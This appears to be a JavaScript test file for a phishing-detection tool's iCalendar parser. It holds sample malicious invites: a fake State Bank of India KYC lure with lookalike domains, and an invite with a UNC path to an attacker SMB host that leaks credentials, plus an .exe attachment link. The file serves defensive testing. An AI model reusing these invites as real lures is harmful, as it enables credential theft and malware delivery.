import { describe, it } from 'node:test';
import assert from 'node:assert';
import { parseIcs, isIcsContent } from '../src/utils/icsParser.js';

describe('RFC 5545 iCalendar (.ics) Threat Parser', () => {
  it('identifies valid iCalendar structure', () => {
    const raw = `BEGIN:VCALENDAR\nVERSION:2.0\nEND:VCALENDAR`;
    assert.strictEqual(isIcsContent(raw), true);
    assert.strictEqual(isIcsContent('Hello world, not a calendar'), false);
  });

  it('extracts organizer identity, summary, and embedded phishing links', () => {
    const ics = `BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//PhishLens//Test//EN
BEGIN:VEVENT
UID:phish-test-01@phishlens
ORGANIZER;CN="State Bank of India Security":mailto:security-alerts@sbi-bank-verify.net
SUMMARY:Urgent: Mandatory NetBanking KYC Verification
DESCRIPTION:Your account will be suspended within 24 hours. Verify now:
 https://sbi-online-banking-portal.net/login
LOCATION:Online Security Portal
URL:https://sbi-online-banking-portal.net/login
END:VEVENT
END:VCALENDAR`;

    const result = parseIcs(ics);
    assert.strictEqual(result.isIcs, true);
    assert.strictEqual(result.summary, 'Urgent: Mandatory NetBanking KYC Verification');
    assert.strictEqual(result.organizerName, 'State Bank of India Security');
    assert.strictEqual(result.organizerEmail, 'security-alerts@sbi-bank-verify.net');
    assert.strictEqual(result.extractedUrls.length >= 1, true);
    assert.strictEqual(result.extractedUrls[0].url, 'https://sbi-online-banking-portal.net/login');
  });

  it('detects dangerous executable attachments and UNC credential leak vectors', () => {
    const maliciousIcs = `BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
SUMMARY:Critical Security Update
ORGANIZER;CN=IT Support:mailto:it@company.com
LOCATION:\\\\malicious-smb-host.attacker.com\\leak
ATTACH:https://malicious-server.example/patch.exe
END:VEVENT
END:VCALENDAR`;

    const result = parseIcs(maliciousIcs);
    assert.strictEqual(result.isIcs, true);
    assert.strictEqual(result.exploitIndicators.length >= 2, true);
    assert.ok(result.exploitIndicators.some((i) => i.includes('UNC network path')));
    assert.ok(result.exploitIndicators.some((i) => i.includes('patch.exe')));
  });
});
